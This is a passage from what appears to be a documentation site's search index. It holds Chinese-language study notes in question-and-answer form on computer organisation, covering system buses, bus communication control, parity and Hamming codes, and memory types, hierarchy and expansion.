<p>10\u3001\u5047\u8bbeMAR\u5bc4\u5b58\u5668\u7684\u4f4d\u6570\u4e3a16\u4f4d\uff0cMDR\u5bc4\u5b58\u5668\u7684\u4f4d\u6570\u4e3a16\u4f4d\uff0c\u5b58\u50a8\u5668\u7684\u6700\u5927\u5bb9\u91cf\u662f\u591a\u5c11\uff1f</p> <p>1\uff09MAR\u5bc4\u5b58\u5668\u7684\u4f4d\u6570\u4e3a16\u4f4d\uff0c\u80fd\u8868\u793a\u7684\u5730\u5740\u4e2a\u6570\u4e3a2\u768416\u6b21\u65b9\uff0c\u4e3a64K\uff1b 2\uff09MDR\u5bc4\u5b58\u5668\u7684\u4f4d\u6570\u4e3a16\u4f4d\uff0c\u8bf4\u660e\u5b58\u50a8\u5b57\u957f\u4e3a16\u4f4d\uff0c\u4e5f\u53732\u4e2a\u5b57\u8282\uff1b 3\uff09\u5b58\u50a8\u5668\u7684\u6700\u5927\u5bb9\u91cf\u4e3a64K * 2B = 128K Byte</p>"},{"location":"other/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/#_3","title":"\u7b2c\u4e09\u7ae0 \u7cfb\u7edf\u603b\u7ebf","text":"<p>1\u3001\u4e3a\u4ec0\u4e48\u8981\u4f7f\u7528\u603b\u7ebf\uff1f</p> <p>\u5728\u51af\u8bfa\u4f9d\u66fc\u7ed3\u6784\u4e2d\uff0c\u5404\u4e2a\u90e8\u4ef6\u4e4b\u95f4\u5747\u6709\u5355\u72ec\u8fde\u7ebf\uff0c\u4e0d\u4ec5\u7ebf\u591a\uff0c\u800c\u4e14\u5bfc\u81f4\u6269\u5c55I/O\u8bbe\u5907\u5f88\u4e0d\u5bb9\u6613\u3002\u5373\u6269\u5c55\u4e00\u4e2aI/O\u8bbe\u5907\uff0c\u9700\u8981\u8fde\u63a5\u5f88\u591a\u7ebf\u3002\u56e0\u6b64\uff0c\u5f15\u5165\u4e86\u603b\u7ebf\u8fde\u63a5\u65b9\u5f0f\uff0c\u5c06\u591a\u4e2a\u8bbe\u5907\u8fde\u63a5\u5728\u540c\u4e00\u7ec4\u603b\u7ebf\u4e0a\uff0c\u6784\u6210\u8bbe\u5907\u4e4b\u95f4\u7684\u516c\u5171\u4f20\u8f93\u901a\u9053\u3002</p> <p>2\u3001\u603b\u7ebf\u7684\u4e24\u5927\u57fa\u672c\u7279\u5f81\u662f\u4ec0\u4e48\uff1f</p> <p>1\uff09\u5171\u4eab\uff1a\u591a\u4e2a\u90e8\u4ef6\u8fde\u63a5\u5728\u540c\u4e00\u7ec4\u603b\u7ebf\u4e0a\uff0c\u5404\u4e2a\u90e8\u4ef6\u4e4b\u95f4\u90fd\u901a\u8fc7\u8be5\u603b\u7ebf\u8fdb\u884c\u6570\u636e\u4ea4\u6362\u3002 2\uff09\u5206\u65f6\uff1a\u540c\u4e00\u65f6\u523b\uff0c\u603b\u7ebf\u4e0a\u53ea\u80fd\u4f20\u8f93\u4e00\u4e2a\u90e8\u4ef6\u53d1\u9001\u7684\u4fe1\u606f\uff1b</p> <p>3\u3001\u7cfb\u7edf\u603b\u7ebf\u6309\u7167\u4f20\u8f93\u4fe1\u606f\u7684\u4e0d\u540c\uff0c\u5206\u6210\u54ea\u51e0\u7c7b\uff1f\u662f\u5355\u5411\u7684\uff0c\u8fd8\u662f\u53cc\u5411\u7684\uff1f</p> <p>1\uff09\u5206\u6210\u6570\u636e\u603b\u7ebf\u3001\u5730\u5740\u603b\u7ebf\u4ee5\u53ca\u63a7\u5236\u603b\u7ebf\u3002 2\uff09\u6570\u636e\u603b\u7ebf\uff1a\u5404\u4e2a\u529f\u80fd\u90e8\u4ef6\u4e4b\u95f4\u4f20\u9001\u6570\u636e\u4fe1\u606f\uff0c\u53cc\u5411\u4f20\u8f93\uff1b 3\uff09\u5730\u5740\u603b\u7ebf\uff1a\u7528\u6765\u6307\u660e\u6570\u636e\u603b\u7ebf\u4e0a\uff0c\u6e90\u6570\u636e\u6216\u76ee\u7684\u6570\u636e\u6240\u5728\u7684\u4e3b\u5b58\u5355\u5143\u7684\u5730\u5740\u3002\u5355\u5411\uff1a\u7531CPU\u53d1\u51fa 4\uff09\u63a7\u5236\u603b\u7ebf\uff1a\u7528\u6765\u53d1\u9001\u5404\u79cd\u63a7\u5236\u4fe1\u53f7\u3002\u5bf9\u4e8e\u63a7\u5236\u603b\u7ebf\u4e2d\u7684\u5355\u6839\u7ebf\uff0c\u662f\u5355\u5411\u7684\uff0c\u5373\u53ea\u80fd\u7531\u4e00\u4e2a\u90e8\u4ef6\u53d1\u5411\u53e6\u4e00\u4e2a\u90e8\u4ef6\u3002\u800c\u4e00\u7ec4\u63a7\u5236\u603b\u7ebf\u4e2d\uff0c\u6709\u8f93\u5165\u4e5f\u6709\u8f93\u51fa\uff0c\u56e0\u6b64\uff0c\u63a7\u5236\u603b\u7ebf\u4e5f\u53ef\u4ee5\u770b\u6210\u662f\u53cc\u5411\u7684\u3002</p> <p>3\u3001\u4ec0\u4e48\u662f\u603b\u7ebf\u5bbd\u5ea6\u3001\u603b\u7ebf\u5e26\u5bbd\u3001\u603b\u7ebf\u590d\u7528\u3001\u4fe1\u53f7\u7ebf\u6570\uff1f</p> <p>1\uff09\u603b\u7ebf\u5bbd\u5ea6\uff1a\u6570\u636e\u603b\u7ebf\u7684\u6839\u6570\uff0c\u4e00\u822c\u662f8\u7684\u500d\u6570\u3002\u662f\u8861\u91cf\u8ba1\u7b97\u673a\u7cfb\u7edf\u6027\u80fd\u7684\u91cd\u8981\u6307\u6807\uff1b 2\uff09\u603b\u7ebf\u5e26\u5bbd\uff1a\u5373\u603b\u7ebf\u6570\u636e\u4f20\u8f93\u901f\u7387\uff0c\u603b\u7ebf\u4e0a\u6bcf\u79d2\u80fd\u591f\u4f20\u8f93\u7684\u6700\u5927\u5b57\u8282\u91cf\u3002 3\uff09\u603b\u7ebf\u590d\u7528\uff1a\u4e00\u6761\u4fe1\u53f7\u7ebf\u4e0a\u5206\u65f6\u4f20\u9001\u4e24\u79cd\u4fe1\u53f7\u3002\u4f8b\u5982\u6570\u636e\u603b\u7ebf\u548c\u5730\u5740\u603b\u7ebf\u7684\u5206\u65f6\u590d\u7528\uff1b 4\uff09\u4fe1\u53f7\u7ebf\u6570\uff1a\u5730\u5740\u603b\u7ebf\u3001\u6570\u636e\u603b\u7ebf\u548c\u63a7\u5236\u603b\u7ebf\u4e09\u79cd\u603b\u7ebf\u7684\u7ebf\u6570\u4e4b\u548c\u3002</p> <p>4\u3001\u5047\u8bbe\u603b\u7ebf\u7684\u5de5\u4f5c\u9891\u7387\u4e3a33MHz\uff0c\u603b\u7ebf\u5bbd\u5ea6\u4e3a32\u4f4d\uff0c\u5219\u5b83\u6700\u5927\u7684\u4f20\u8f93\u901f\u7387\u662f\u591a\u5c11\uff1f</p> <p>33 * \uff0832/8\uff09 = 132 MB/s</p> <p>5\u3001\u7b80\u8981\u8bf4\u660e\u5355\u603b\u7ebf\u7ed3\u6784\u7684\u6982\u5ff5\u53ca\u7f3a\u70b9\uff1f\uff08\u73b0\u4ee3\u8ba1\u7b97\u673a\u4e3a\u4ec0\u4e48\u8981\u91c7\u7528\u591a\u603b\u7ebf\u7ed3\u6784\uff1f\uff09</p> <p>\u5728\u5355\u603b\u7ebf\u7ed3\u6784\u4e2d\uff0c\u6240\u6709\u7684\u90e8\u4ef6\uff08CPU\u3001\u4e3b\u5b58\u3001I/O\u8bbe\u5907\uff09\u90fd\u8fde\u63a5\u5728\u4e00\u7ec4\u603b\u7ebf\u4e0a\u3002\u4f46\u6240\u6709\u7684\u4fe1\u606f\u4f20\u9001\u90fd\u8981\u901a\u8fc7\u8fd9\u7ec4\u603b\u7ebf\uff0c\u540c\u65f6\u53ea\u80fd\u6709\u4e00\u4e2a\u90e8\u4ef6\u5411\u603b\u7ebf\u4e0a\u53d1\u9001\u4fe1\u606f\uff0c\u5bfc\u81f4\u603b\u7ebf\u6210\u4e3a\u7cfb\u7edf\u7684\u74f6\u9888\u3002</p> <p>\u56e0\u6b64\uff0c\u53d1\u5c55\u51fa\u6765\u4e86\u591a\u603b\u7ebf\u7ed3\u6784\uff0c\u5176\u57fa\u672c\u601d\u60f3\u5747\u662f\u5c06\u901f\u5ea6\u76f8\u8fd1\u7684\u8bbe\u5907\u6302\u63a5\u5728\u540c\u4e00\u7ec4\u603b\u7ebf\u4e0a\uff0c\u603b\u7ebf\u4e4b\u95f4\u901a\u8fc7\u603b\u7ebf\u63a7\u5236\u5668\u76f8\u8fde\u3002\u4f8b\u5982CPU\u548cCache\u4e4b\u95f4\u3001I/O\u8bbe\u5907\u4e4b\u95f4\u7b49\u3002</p> <p>6\u3001\u96c6\u4e2d\u5f0f\u603b\u7ebf\u5224\u4f18\u63a7\u5236\u6709\u54ea\u4e09\u79cd\u65b9\u5f0f\uff0c\u54ea\u79cd\u65b9\u5f0f\u7684\u4f18\u5148\u7ea7\u4e0d\u80fd\u6539\u53d8\uff1f</p> <p>1\uff09\u94fe\u5f0f\u67e5\u8be2\u3001\u8ba1\u6570\u5668\u5b9a\u65f6\u67e5\u8be2\u3001\u4ee5\u53ca\u72ec\u7acb\u8bf7\u6c42\u3002 2\uff09\u94fe\u5f0f\u67e5\u8be2\u7684\u4f18\u5148\u7ea7\u4e0d\u80fd\u6539\u53d8\uff0c\u79bb\u63a7\u5236\u5668\u6700\u8fd1\u7684\u4f18\u5148\u7ea7\u6700\u9ad8\u3002</p> <p>7\u3001\u7b80\u8ff0\u94fe\u5f0f\u67e5\u8be2\u3001\u8ba1\u6570\u5668\u5b9a\u65f6\u67e5\u8be2\u4ee5\u53ca\u72ec\u7acb\u8bf7\u6c42\u4e09\u79cd\u65b9\u5f0f\u7684\u5de5\u4f5c\u539f\u7406\u3002</p> <p>\uff08\u7565\uff09</p> <p>8\u3001\u4ec0\u4e48\u662f\u603b\u7ebf\u5468\u671f\uff0c\u5206\u4e3a\u54ea\u51e0\u4e2a\u9636\u6bb5\uff1f</p> <p>1\uff09\u603b\u7ebf\u5468\u671f\uff1a\u603b\u7ebf\u4e0a\u4e24\u4e2a\u90e8\u4ef6\u5b8c\u6210\u4e00\u6b21\u5b8c\u6574\u4e14\u53ef\u9760\u7684\u6570\u636e\u4f20\u8f93\u65f6\u95f4\uff1b 2\uff09\u5206\u4e3a\u56db\u4e2a\u9636\u6bb5\uff1a \u7533\u8bf7\u5206\u914d\u9636\u6bb5\uff1a\u7533\u8bf7\u603b\u7ebf \u5bfb\u5740\u9636\u6bb5\uff1a\u53d1\u51fa\u5730\u5740\u53ca\u6709\u5173\u547d\u4ee4 \u4f20\u6570\u9636\u6bb5\uff1a\u8fdb\u884c\u6570\u636e\u4ea4\u6362 \u7ed3\u675f\uff1a\u4ece\u603b\u7ebf\u4e0a\u64a4\u9664\u4fe1\u53f7\uff0c\u8ba9\u51fa\u603b\u7ebf</p> <p>9\u3001\u4ec0\u4e48\u662f\u603b\u7ebf\u901a\u4fe1\u63a7\u5236\uff0c\u603b\u7ebf\u901a\u4fe1\u63a7\u5236\u6709\u54ea\u51e0\u79cd\uff1f</p> <p>1\uff09\u603b\u7ebf\u901a\u4fe1\u63a7\u5236\uff1a\u89e3\u51b3\u901a\u4fe1\u53cc\u65b9\u5982\u4f55\u83b7\u77e5\u4f20\u8f93\u5f00\u59cb\u548c\u4f20\u8f93\u7ed3\u675f\uff0c\u4ee5\u53ca\u5982\u4f55\u534f\u8c03\u914d\u5408\uff1b 2\uff09\u540c\u6b65\u901a\u4fe1\u3001\u5f02\u6b65\u901a\u4fe1\u3001\u534a\u540c\u6b65\u901a\u4fe1\u3001\u5206\u79bb\u5f0f\u901a\u4fe1</p> <p>10\u3001\u4ec0\u4e48\u662f\u540c\u6b65\u901a\u4fe1\uff1f\u5176\u4f18\u70b9\u548c\u7f3a\u70b9\uff1f</p> <p>\uff11\uff09\u540c\u6b65\u901a\u4fe1\uff1a\u603b\u7ebf\u4e0a\u5404\u4e2a\u90e8\u4ef6\u7531\u7edf\u4e00\u7684\u65f6\u949f\u4fe1\u53f7\u63a7\u5236\uff1b\u5728\u603b\u7ebf\u5468\u671f\u4e2d\uff0c\u6bcf\u4e2a\u65f6\u949f\u5468\u671f\u5404\u4e2a\u90e8\u4ef6\u5982\u4f55\u52a8\u4f5c\u90fd\u6709\u660e\u786e\u7684\u89c4\u5b9a\u3002 \uff12\uff09\u4f18\u70b9\uff1a\u901f\u5ea6\u5feb\uff0c\u5404\u4e2a\u6a21\u5757\u95f4\u914d\u5408\u7b80\u5355 \uff13\uff09\u7f3a\u70b9\uff1a\u4ee5\u603b\u7ebf\u4e0a\u6700\u6162\u7684\u90e8\u4ef6\u6765\u8bbe\u8ba1\u516c\u5171\u65f6\u949f\uff0c\u5f71\u54cd\u603b\u7ebf\u6548\u7387\u3002</p> <p>11\u3001\u4ec0\u4e48\u662f\u5f02\u6b65\u901a\u4fe1\uff1f\u5f02\u6b65\u901a\u4fe1\u5206\u4e3a\u54ea\u51e0\u79cd\u7c7b\u578b\uff1f</p> <p>1\uff09\u5f02\u6b65\u901a\u4fe1\uff1a\u603b\u7ebf\u4e0a\u5404\u90e8\u4ef6\u6ca1\u6709\u7edf\u4e00\u7684\u65f6\u949f\u6807\u51c6\uff0c\u91c7\u7528\u5e94\u7b54\u5f0f\u901a\u4fe1\uff1b\uff08\u4e3b\u6a21\u5757\u53d1\u51fa\u8bf7\u6c42\u540e\uff0c\u4e00\u76f4\u7b49\u5230\u4ece\u6a21\u5757\u53cd\u9988\u56de\u6765\u5e94\u7b54\u4fe1\u53f7\u4e4b\u540e\u624d\u5f00\u59cb\u901a\u4fe1\uff09 2\uff09\u4e0d\u4e92\u9501\u3001\u534a\u4e92\u9501\u3001\u5168\u4e92\u9501\u3002\uff08\u9700\u8981\u4e86\u89e3\u5404\u79cd\u65b9\u5f0f\u7684\u542b\u4e49\uff09</p> <p>12\u3001\u4ec0\u4e48\u662f\u6ce2\u7279\u7387\uff1f\u4ec0\u4e48\u662f\u6bd4\u7279\u7387\uff1f\uff08\u9700\u8981\u638c\u63e1\u5982\u4f55\u8ba1\u7b97\u6ce2\u7279\u7387\u3001\u6bd4\u7279\u7387\uff09</p> <p>\u6ce2\u7279\u7387\uff1a\u5355\u4f4d\u65f6\u95f4\u5185\u4f20\u9001\u7684\u4e8c\u8fdb\u5236\u6570\u636e\u6570\u636e\u7684\u4f4d\u6570\uff0c\u5355\u4f4dbps \u6bd4\u7279\u7387\uff1a\u5355\u4f4d\u65f6\u95f4\u5185\u4f20\u9001\u7684\u6709\u6548\u7684\u4e8c\u8fdb\u5236\u4f4d\u6570\u3002</p> <p>13\u3001\u5f02\u6b65\u901a\u4fe1\u65f6\uff0c\u5e38\u89c4\u9700\u8981\u8bbe\u7f6e\u7684\u53c2\u6570\u6709\u54ea\u4e9b\uff1f</p> <p>\u6ce2\u7279\u7387\u3001\u505c\u6b62\u4f4d\uff08\u00bd/1.5\uff09\u3001\u6821\u9a8c\u4f4d\uff08\u5947\u6821\u9a8c\u3001\u5076\u6821\u9a8c\u3001\u65e0\u6821\u9a8c\uff09</p> <p>14\u3001\u7b80\u8ff0\u534a\u540c\u6b65\u901a\u4fe1\u7684\u57fa\u672c\u539f\u7406\u3002</p> <p>\u534a\u540c\u6b65\u901a\u4fe1\u7ed3\u5408\u540c\u6b65\u901a\u4fe1\u548c\u5f02\u6b65\u901a\u4fe1\u3002\u540c\u6b65\u901a\u4fe1\uff1a\u91c7\u7528\u7edf\u4e00\u7684\u65f6\u949f\uff0c\u89c4\u5b9a\u4e86\u5728\u4e00\u5b9a\u7684\u65f6\u949f\u5468\u671f\u5e72\u4ec0\u4e48\u4e8b\u60c5\uff1b\u5f02\u6b65\u901a\u4fe1\uff1a\u5982\u679c\u4ece\u6a21\u5757\u6ca1\u6709\u51c6\u5907\u597d\uff0c\u589e\u52a0\u4e00\u4e2a\u201c\u7b49\u5f85\u54cd\u5e94\u201d\u4fe1\u53f7\u3002</p> <p>15\u3001\u7b80\u8ff0\u5206\u79bb\u5f0f\u901a\u4fe1\u7684\u57fa\u672c\u539f\u7406\u3002</p> <p>\u4e3b\u6a21\u5757\u53d1\u51fa\u5730\u5740\u548c\u547d\u4ee4\u4e4b\u540e\uff0c\u653e\u5f03\u603b\u7ebf\uff0c\u5728\u4ece\u6a21\u5757\u51c6\u5907\u6570\u636e\u671f\u95f4\uff0c\u4f7f\u5f97\u603b\u7ebf\u53ef\u4ee5\u88ab\u5176\u4ed6\u8bbe\u5907\u6240\u7528\u3002\u63d0\u9ad8\u603b\u7ebf\u5229\u7528\u7387\u3002\u4f46\u662f\uff0c\u8fd9\u79cd\u65b9\u5f0f\u63a7\u5236\u6bd4\u8f83\u590d\u6742\u3002</p> <p>16\u3001\u5947\u5076\u6821\u9a8c\u53ef\u4ee5\u7ea0\u9519\u5417\uff1f\u6c49\u660e\u7801\u53ef\u4ee5\u7ea0\u9519\u7801\uff1f 1\uff09\u5947\u5076\u6821\u9a8c\u53ea\u80fd\u68c0\u9519\uff0c\u4e0d\u80fd\u7ea0\u9519\u3002 2\uff09\u6c49\u660e\u7801\u53ef\u4ee5\u7ea0\u9519\u3002</p>"},{"location":"other/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/#_4","title":"\u7b2c\u56db\u7ae0 \u5b58\u50a8\u5668","text":"<p>1\u3001\u5b58\u50a8\u5668\u6309\u5b58\u53d6\u65b9\u5f0f\uff0c\u53ef\u4ee5\u5206\u6210\u54ea\u56db\u7c7b\uff1f\u54ea\u4e9b\u5c5e\u4e8e\u968f\u673a\u8bbf\u95ee\u5b58\u50a8\u5668\uff0c\u54ea\u4e9b\u5c5e\u4e8e\u4e32\u884c\u8bbf\u95ee\u5b58\u50a8\u5668\uff1f</p> <p>1\uff09\u53ef\u4ee5\u5206\u4e3a\u968f\u673a\u5b58\u50a8\u5668\u3001\u53ea\u8bfb\u5b58\u50a8\u5668\u3001\u987a\u5e8f\u5b58\u50a8\u5668\u548c\u76f4\u63a5\u5b58\u50a8\u5668\uff1b 2\uff09\u968f\u673a\u5b58\u50a8\u5668\u548c\u53ea\u8bfb\u5b58\u50a8\u5668\u5c5e\u4e8e\u968f\u673a\u5b58\u50a8\u5668\uff0c\u5373\u5b58\u53d6\u65f6\u95f4\u4e0e\u7269\u7406\u5730\u5740\u65e0\u5173\uff1b 3\uff09\u987a\u5e8f\u5b58\u50a8\u5668\uff08\u5178\u578b\u7684\u5982\u78c1\u5e26\uff09\u548c\u76f4\u63a5\u5b58\u50a8\u5668\uff08\u5178\u578b\u7684\u5982\u78c1\u76d8\uff09\u5c5e\u4e8e\u4e32\u884c\u5b58\u50a8\u5668\uff0c\u5373\u5b58\u53d6\u65f6\u95f4\u4e0e\u7269\u7406\u5730\u5740\u6709\u5173\u3002</p> <p>2\u3001\u8861\u91cf\u5b58\u50a8\u5668\u4f7f\u7528\u54ea\u4e09\u4e2a\u6307\u6807\uff1f\u5bc4\u5b58\u5668\u3001\u7f13\u5b58\u3001\u4e3b\u5b58\u4e2d\uff0c\u54ea\u4e2a\u901f\u5ea6\u6700\u5feb\uff1f\u54ea\u4e2a\u6700\u4fbf\u5b9c\uff1f</p> <p>1\uff09\u901f\u5ea6\u3001\u5bb9\u91cf\u3001\u4f4d\u4ef7\u683c\u3002 2\uff09\u5bc4\u5b58\u5668\u901f\u5ea6\u6700\u5feb\uff0c\u4e3b\u5b58\u6700\u4fbf\u5b9c\u3002</p> <p>3\u3001\u5e38\u89c1\u7684\u5b58\u50a8\u7cfb\u7edf\u5c42\u6b21\u7ed3\u6784\u6709\u54ea\u4e24\u79cd\uff1f\u900f\u660e\u6027\u5982\u4f55\uff1f\u5404\u81ea\u7528\u6765\u89e3\u51b3\u4ec0\u4e48\u95ee\u9898\u7684\uff1f</p> <p>1\uff09\u7f13\u5b58-\u4e3b\u5b58\u5c42\u6b21\uff1a\u7528\u6765\u7f13\u89e3CPU\u548c\u4e3b\u5b58\u901f\u5ea6\u4e0d\u5339\u914d\u7684\u95ee\u9898\uff0c\u7531\u786c\u4ef6\u6765\u5b8c\u6210\uff0c\u5bf9\u6240\u6709\u7684\u7a0b\u5e8f\u5458\u5b8c\u5168\u900f\u660e\u3002 2\uff09\u4e3b\u5b58-\u8f85\u5b58\u5c42\u6b21\uff1a\u7528\u6765\u89e3\u51b3\u4e3b\u5b58\u5bb9\u91cf\u4e0d\u591f\u7684\u95ee\u9898\uff0c\u7531\u64cd\u4f5c\u7cfb\u7edf\u548c\u786c\u4ef6\u5171\u540c\u5b8c\u6210\uff0c\u5bf9\u5e94\u7528\u7a0b\u5e8f\u8bbe\u8ba1\u8005\u900f\u660e\uff0c\u5bf9\u7cfb\u7edf\u7a0b\u5e8f\u8bbe\u8ba1\u8005\u4e0d\u900f\u660e\u3002</p> <p>\uff08\u73b0\u5728\u4e00\u822c\u5b58\u50a8\u5668\u90fd\u5373\u80fd\u6309\u5b57\u8bbf\u95ee\uff0c\u4e5f\u80fd\u6309\u7167\u5b57\u8282\u8bbf\u95ee\uff0c\u56e0\u6b64\uff0c\u5b58\u50a8\u5668\u7f16\u5740\u65f6\uff0c\u6bcf\u4e2a\u5b57\u8282\u90fd\u6709\u4e00\u4e2a\u72ec\u7acb\u7684\u5730\u5740\u3002\uff09</p> <p>4\u3001\u5b57\u5728\u5b58\u50a8\u5355\u5143\u4e2d\u6709\u4e24\u79cd\u5b58\u50a8\u65b9\u5f0f\uff0c\u5927\u7aef\u65b9\u5f0f\u548c\u5c0f\u7aef\u65b9\u5f0f\u3002\u5404\u662f\u4ec0\u4e48\u542b\u4e49\uff1fx86\u91c7\u7528\u7684\u662f\u54ea\u79cd\u5b58\u50a8\u65b9\u5f0f\uff1f</p> <p>1\uff09\u5927\u7aef\u65b9\u5f0f\uff1a\u5b57\u7684\u4f4e\u4f4d\u5b58\u5728\u5185\u5b58\u7684\u9ad8\u5730\u5740\u4e2d\uff0c\u800c\u5b57\u7684\u9ad8\u4f4d\u5b58\u5728\u5185\u5b58\u7684\u4f4e\u5730\u5740\u4e2d\uff1b 2\uff09\u5c0f\u7aef\u65b9\u5f0f\uff1a\u5b57\u7684\u4f4e\u4f4d\u5b58\u5728\u5185\u5b58\u7684\u4f4e\u5730\u5740\u4e2d\uff0c\u800c\u5b57\u7684\u9ad8\u4f4d\u5b58\u5728\u5185\u5b58\u7684\u9ad8\u5730\u5740\u4e2d\u3002 3\uff09x86CPU\u91c7\u7528\u7684\u662f\u5c0f\u7aef\u65b9\u5f0f\u3002</p> <p>5\u3001\u4e3b\u5b58\u7684\u4e09\u4e2a\u4e3b\u8981\u6280\u672f\u6307\u6807</p> <p>\u5b58\u50a8\u5bb9\u91cf\u3001\u5b58\u53d6\u901f\u5ea6\u548c\u5b58\u50a8\u5e26\u5bbd</p> <p>6\u3001\u4ec0\u4e48\u662f\u5b58\u53d6\u65f6\u95f4\uff1f\u4ec0\u4e48\u662f\u5b58\u53d6\u5468\u671f\uff1f\u54ea\u4e2a\u5927\uff1f</p> <p>1\uff09\u5b58\u53d6\u65f6\u95f4\uff1a\u542f\u52a8\u4e00\u6b21\u5b58\u50a8\u5668\u5b8c\u6210\u672c\u6b21\u64cd\u4f5c\uff08\u8bfb\u6216\u5199\uff09\u6240\u9700\u7684\u65f6\u95f4\uff1b 2\uff09\u5b58\u53d6\u5468\u671f\uff1a\u8fde\u7eed\u4e24\u6b21\u542f\u52a8\u5b58\u50a8\u5668\u6240\u9700\u8981\u7684\u6700\u5c0f\u95f4\u9694\u65f6\u95f4\uff1b 3\uff09\u5b58\u53d6\u5468\u671f\u5305\u542b\u5b58\u53d6\u65f6\u95f4\uff1b</p> <p>7\u3001\u4ec0\u4e48\u662f\u5b58\u50a8\u5668\u5e26\u5bbd\uff1f\uff08\u8981\u4e86\u89e3\u5982\u4f55\u8ba1\u7b97\u5b58\u50a8\u5668\u5e26\u5bbd\uff09</p> <p>\u5355\u4f4d\u65f6\u95f4\u5185\u5b58\u50a8\u5668\u5b58\u53d6\u7684\u4fe1\u606f\u91cf\uff1b</p> <p>8\u3001\u534a\u5bfc\u4f53\u5b58\u50a8\u82af\u7247\u8bd1\u7801\u9a71\u52a8\u5305\u542b\u54ea\u4e24\u79cd\u65b9\u5f0f\uff0c\u8bf7\u7b80\u8981\u8bf4\u660e\u3002</p> <p>1\uff09\u7ebf\u9009\u6cd5\uff1a\u6240\u6709\u7684\u5730\u5740\u82af\u7247\u901a\u8fc7\u4e00\u4e2a\u8bd1\u7801\u5668\u8bd1\u7801\uff0c\u9009\u62e9\u4e00\u4e2a\u5b58\u50a8\u5355\u5143\u7684\u5404\u4f4d\uff0c\u9002\u5408\u4e8e\u5b58\u50a8\u5bb9\u91cf\u4e0d\u5927\u7684\u82af\u7247\uff1b 2\uff09\u91cd\u5408\u6cd5\uff1a\u5c06\u5730\u5740\u5206\u4e3a\u4e24\u7ec4\uff0c\u6bcf\u7ec4\u901a\u8fc7\u4e00\u4e2a\u8bd1\u7801\u5668\u8bd1\u7801\uff0c\u9009\u62e9\u884c\u6216\u5217\uff0c\u884c\u3001\u5217\u4ea4\u53c9\u5904\u5c31\u662f\u8981\u8bbf\u95ee\u7684\u5b58\u50a8\u4f4d\u3002</p> <p>9\u3001\u968f\u673a\u5b58\u50a8\u5668\u5305\u542b\u54ea\u4e24\u5927\u7c7b\uff1f\u54ea\u4e2a\u9700\u8981\u5237\u65b0\uff1f\u8bf7\u4ece\u901f\u5ea6\u3001\u5bb9\u91cf\u3001\u4ef7\u683c\u7b49\u65b9\u9762\u8fdb\u884c\u7b80\u8981\u6bd4\u8f83\u3002</p> <p>1\uff09\u9759\u6001RAM\uff1a\u91c7\u7528\u9501\u5b58\u5668\u539f\u7406\u5b9e\u73b0\uff1b 2\uff09\u52a8\u6001RAM\uff1a\u91c7\u7528\u7535\u5bb9\u539f\u7406\u5b9e\u73b0\uff0c\u9700\u8981\u5237\u65b0\u3002 3\uff09\u76f8\u6bd4\u4e8e\u52a8\u6001RAM\uff0c\u9759\u6001RAM\u7684\u901f\u5ea6\u5feb\u3001\u5bb9\u91cf\u5c0f\u3001\u4ef7\u683c\u9ad8\uff0c\u4e00\u822c\u7528\u4e8e\u7f13\u5b58\uff0c\u800c\u52a8\u6001RAM\u4e00\u822c\u7528\u4e8e\u5185\u5b58\u3002</p> <p>10\u3001\u53ea\u8bfb\u5b58\u50a8\u5668\u6709\u54ea\u51e0\u79cd\uff1f</p> <p>1\uff09\u63a9\u6a21ROM\uff08MROM\uff09\uff1a\u51fa\u5382\u540e\u5185\u5bb9\u4e0d\u80fd\u88ab\u66f4\u6539\u3002 2\uff09PROM\uff1a\u53ef\u7f16\u7a0b\u53ea\u8bfb\u5b58\u50a8\u5668\uff0c\u53ef\u4ee5\u8fdb\u884c\u4e00\u6b21\u6027\u7f16\u7a0b\uff1b 3\uff09EPROM\uff1a\u53ef\u64e6\u9664\u53ea\u8bfbROM\uff0c\u7528\u7d2b\u5916\u7ebf\u7167\u5c04\uff1b 4\uff09EEPROM\uff1a\u7535\u53ef\u64e6\u9664\u53ea\u8bfbROM\u3002 6\uff09FLash Memory\uff1a\u91c7\u7528EEPROM\u7684\u975e\u6613\u5931\u6027\u5b58\u50a8\u5668\u3002</p> <p>11\u3001\u5355\u7247\u5b58\u50a8\u5668\u82af\u7247\u7684\u5bb9\u91cf\u6709\u9650\uff0c\u5f88\u96be\u6ee1\u8db3\u5b9e\u9645\u9700\u8981\uff0c\u56e0\u6b64\u5fc5\u987b\u5c06\u82e5\u5e72\u5b58\u50a8\u82af\u7247\u8fde\u63a5\u5728\u4e00\u8d77\u624d\u80fd\u7ec4\u6210\u8db3\u591f\u5bb9\u91cf\u7684\u5b58\u50a8\u5668\u3002 \u5b58\u50a8\u5668\u7684\u6269\u5c55\u901a\u5e38\u6709\u4f4d\u6269\u5c55\u548c\u5b57\u6269\u5c55\uff0c\u4ec0\u4e48\u662f\u5b57\u6269\u5c55\uff0c\u4ec0\u4e48\u662f\u4f4d\u6269\u5c55\uff1f\u8bf7\u4e3e\u4f8b\u7b80\u8981\u8bf4\u660e 1\uff09\u4f4d\u6269\u5c55\uff1a\u589e\u52a0\u5b58\u50a8\u5668\u7684\u5b57\u957f\uff0c\u4f8b\u5982\u4e24\u4e2a1K * 4\u4f4d\u7684\u5b58\u50a8\u82af\u7247\u6784\u62101\u4e2a1K*8\u4f4d\u7684\u5b58\u50a8\u5668\uff1b 2\uff09\u5b57\u6269\u5c55\uff1a\u589e\u52a0\u5b58\u50a8\u5668\u7684\u5b57\u6570\uff0c\u4f8b\u5982\u4e24\u4e2a1K * 8\u4f4d\u7684\u5b58\u50a8\u82af\u7247\u6784\u62101\u4e2a2K * 8\u4f4d\u7684\u5b58\u50a8\u5668\uff1b \u901a\u5e38\u5b57\u6269\u5c55\u548c\u4f4d\u6269\u5c55\u4e24\u79cd\u65b9\u5f0f\u6df7\u5408\u4f7f\u7528\u3002</p> <p>12\u3001\u719f\u8651\u638c\u63e1\u5b58\u50a8\u5668\u7684\u6269\u5c55\uff0c\u5305\u62ec\u5730\u5740\u7a7a\u95f4\u5206\u914d\u3001\u5730\u5740\u7ebf\u7684\u8fde\u63a5\u3001\u6570\u636e\u7ebf\u7684\u8fde\u63a5\u3001\u7247\u9009\u4fe1\u53f7\u7684\u4ea7\u751f\u53ca\u8fde\u63a5\u7b49\uff1b 